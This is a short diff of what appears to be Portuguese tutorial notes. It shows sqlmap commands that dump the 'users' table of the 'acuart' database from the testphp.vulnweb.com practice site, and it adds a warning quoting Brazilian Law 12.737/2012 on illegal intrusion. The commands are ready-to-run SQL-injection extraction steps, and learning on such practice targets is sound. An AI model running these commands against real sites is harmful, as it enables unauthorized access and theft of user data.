@@ -9,3 +9,9 @@ python2 sqlmap.py sqlmap.py --url "http://testphp.vulnweb.com/listproducts.php?c
 
 # pegando os usuarios do banco
 python2 sqlmap.py sqlmap.py --url "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch --dump -T users -D acuart
+
+
+
+Só lembrando que invadir um site é crime conforme a Lei 12.737/2012 no Art. 154-A. Invadir dispositivo informático alheio, conectado ou não à rede de computadores, mediante violação indevida de mecanismo de segurança e com o fim de obter, adulterar ou destruir dados ou informações sem autorização expressa ou tácita do titular do dispositivo ou instalar vulnerabilidades para obter vantagem ilícita:
+Pena – detenção, de 3 (três) meses a 1 (um) ano, e multa.
+Lei Nº 12.737, de 30 de novembro de 2012.
